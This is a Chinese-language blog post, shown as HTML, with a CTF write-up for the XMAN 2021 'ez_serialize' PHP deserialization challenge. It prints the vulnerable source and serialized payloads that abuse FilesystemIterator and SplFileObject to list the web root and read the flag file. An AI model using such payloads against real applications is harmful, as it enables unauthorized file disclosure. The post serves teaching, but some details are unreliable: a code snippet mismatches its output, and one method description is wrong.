@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ez_serialize赛宁环境：http:&#x2F;&#x2F;119.3.220.83:32868&#x2F; 题目源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phperror_reporting(0); # 不报错highlight_file(__FILE__); #">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xman-2021">
+<meta property="og:url" content="https://yenannn.github.io/2022/03/25/xman-2021/index.html">
+<meta property="og:site_name" content="Yenan&#39;s blog">
+<meta property="og:description" content="ez_serialize赛宁环境：http:&#x2F;&#x2F;119.3.220.83:32868&#x2F; 题目源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?phperror_reporting(0); # 不报错highlight_file(__FILE__); #">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/202203251029204.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/202203251029206.png">
+<meta property="og:image" content="https://gitee.com/DuWA/blog/raw/master/img/202203251029207.png">
+<meta property="article:published_time" content="2022-03-25T02:27:29.000Z">
+<meta property="article:modified_time" content="2022-03-25T02:29:32.676Z">
+<meta property="article:author" content="Yenan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/DuWA/blog/raw/master/img/202203251029204.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>xman-2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2022/03/25/ByteCTF-jFinal/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/25/xman-2021/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/25/xman-2021/&text=xman-2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/25/xman-2021/&is_video=false&description=xman-2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xman-2021&body=Check out this article: https://yenannn.github.io/2022/03/25/xman-2021/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/25/xman-2021/&name=xman-2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/25/xman-2021/&t=xman-2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-serialize"><span class="toc-number">1.</span> <span class="toc-text">ez_serialize</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        xman-2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Yenan</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-03-25T02:27:29.000Z" itemprop="datePublished">2022-03-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h2><p>赛宁环境：<a target="_blank" rel="noopener" href="http://119.3.220.83:32868/">http://119.3.220.83:32868/</a></p>
+<p>题目源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="comment"># 不报错</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); <span class="comment"># 把前端代码高亮了</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) # <span class="title">php</span>的构造函数，<span class="title">new</span>一个对象的时候会被调用</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">Hel</span>&quot;; # <span class="title">this</span>表示 <span class="title">XMAN</span>.<span class="title">class</span></span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;<span class="title">xctfer</span>&quot;;</span></span><br><span class="line"><span class="class">        <span class="title">echo</span> <span class="title">new</span>  $<span class="title">this</span>-&gt;<span class="title">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>); # <span class="title">new</span>的是<span class="title">Hel</span>(<span class="title">xctfer</span>)</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__wakeup</span>() # <span class="title">php</span>的反序列化函数，反序列化时被调用</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;check = <span class="keyword">new</span> <span class="title class_">Filter</span>; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;para) &amp;&amp; <span class="variable language_">$this</span>-&gt;check-&gt;<span class="title function_ invoke__">vaild</span>(<span class="variable">$this</span>-&gt;<span class="keyword">class</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">new</span>  <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> ($<span class="title">this</span>-&gt;<span class="title">para</span>); # 实例化，利用的点在这</span></span><br><span class="line"><span class="class">            # <span class="title">FilesystemIterator</span>(/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>) 打印目录</span></span><br><span class="line"><span class="class">            # <span class="title">SplFileObject</span>(/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/<span class="title">flag</span>.<span class="title">php</span>) 打印 <span class="title">flag</span>.<span class="title">php</span>文件</span></span><br><span class="line"><span class="class">        &#125;</span></span><br><span class="line"><span class="class">        <span class="title">else</span></span></span><br><span class="line"><span class="class">            <span class="title">die</span>(&#x27;<span class="title">what</span>?<span class="title">Really</span>?&#x27;);</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">Hel</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;Hello bro, I guess you are a lazy &quot;</span>.<span class="variable language_">$this</span>-&gt;a); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Filter</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">vaild</span>(<span class="params"><span class="variable">$code</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[!|@|#|$|%|^|&amp;|*|=|\&#x27;|&quot;|:|;|?]/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xctf&#x27;</span>]); <span class="comment"># 如果定义了xctf参数，就反序列化它</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> XMAN;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>序列化 serialize是把对象序列化为字符串</p>
+<p>反序列化 unserialize是把字符串重新输出为对象，具体怎么输出定义在 __wakeup() 中</p>
+<p>这里我们需要一个遍历目录的内置类，需要一个打印文件内容的类</p>
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>Intrudution</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>FilesystemIterator</code></td>
+<td>The Filesystem iterator    打印指定目录FilesystemIterator(目录)</td>
+</tr>
+<tr>
+<td><code>SplFileObject</code></td>
+<td>The SplFileObject class offers an object oriented interface for a file.    打印指定文件Spl(file)</td>
+</tr>
+</tbody></table>
+<p>用法都是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">FilesystemIterator</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/&quot;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">poc</span> = <span class="title">new</span> <span class="title">XMAN</span>();</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">poc</span>);</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"># <span class="title">O</span>:4:&quot;<span class="title">XMAN</span>&quot;:2:</span>&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;FilesystemIterator&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;para&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;/var/www/html/&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>打印出了</p>
+<img src="https://gitee.com/DuWA/blog/raw/master/img/202203251029204.png" alt="image-20210812121311810" style="zoom: 33%;" />
+
+<p>继续打印</p>
+<img src="https://gitee.com/DuWA/blog/raw/master/img/202203251029206.png" alt="image-20210812121405359" style="zoom:33%;" />
+
+<p>更换对象打印出文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span> = &quot;<span class="title">FilesystemIterator</span>&quot;;</span></span><br><span class="line"><span class="class">        $<span class="title">this</span>-&gt;<span class="title">para</span> = &quot;/<span class="title">var</span>/<span class="title">www</span>/<span class="title">html</span>/&quot;;</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">$<span class="title">poc</span> = <span class="title">new</span> <span class="title">XMAN</span>();</span></span><br><span class="line"><span class="class"><span class="title">echo</span> <span class="title">serialize</span>($<span class="title">poc</span>);</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class"># <span class="title">O</span>:4:&quot;<span class="title">XMAN</span>&quot;:2:</span>&#123;s:<span class="number">5</span>:<span class="string">&quot;class&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;SplFileObject&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;para&quot;</span>;s:<span class="number">37</span>:<span class="string">&quot;/var/www/html/xxxXXXmMManNNn/f1a4.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于是php文件，&lt;?不被html识别，就放在注释里面了，crtl+u查看</p>
+<img src="https://gitee.com/DuWA/blog/raw/master/img/202203251029207.png" alt="image-20210812121653615" style="zoom:33%;" />
+
+<p>几个魔术方法</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__construct()</td>
+<td>new的时候被调用，构造函数</td>
+</tr>
+<tr>
+<td>__wakeup()</td>
+<td>serialize时被调用</td>
+</tr>
+<tr>
+<td>__toString()</td>
+<td>unserialize后作为字符串时变量时被调用</td>
+</tr>
+</tbody></table>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XMAN</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span>=<span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$para</span>=<span class="string">&quot;/var/www/html&quot;</span>;</span><br><span class="line">    <span class="comment">// public $check;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot; I wakeup\n&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;I am String\n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">XMAN</span>());</span><br><span class="line"><span class="variable">$b</span>= <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>-&gt;<span class="keyword">class</span>.<span class="string">&quot;\n&quot;</span>.<span class="variable">$b</span>-&gt;para;</span><br></pre></td></tr></table></figure>
+
+<p>输出</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">O:4:<span class="string">&quot;XMAN&quot;</span>:2:&#123;s:5:<span class="string">&quot;class&quot;</span>;s:13:<span class="string">&quot;SplFileObject&quot;</span>;s:4:<span class="string">&quot;para&quot;</span>;s:13:<span class="string">&quot;/var/www/html&quot;</span>;&#125; I wakeup</span><br><span class="line"><span class="comment">#序列化时调用</span></span><br><span class="line">I am String</span><br><span class="line"><span class="comment">#把反序列化后的对象作为字符串时调用，echo这里是默认成字符串变量了</span></span><br><span class="line">SplFileObject</span><br><span class="line">/var/www/html</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-serialize"><span class="toc-number">1.</span> <span class="toc-text">ez_serialize</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://yenannn.github.io/2022/03/25/xman-2021/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://yenannn.github.io/2022/03/25/xman-2021/&text=xman-2021"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://yenannn.github.io/2022/03/25/xman-2021/&is_video=false&description=xman-2021"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=xman-2021&body=Check out this article: https://yenannn.github.io/2022/03/25/xman-2021/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://yenannn.github.io/2022/03/25/xman-2021/&title=xman-2021"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://yenannn.github.io/2022/03/25/xman-2021/&name=xman-2021&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://yenannn.github.io/2022/03/25/xman-2021/&t=xman-2021"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2022
+    Yenan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
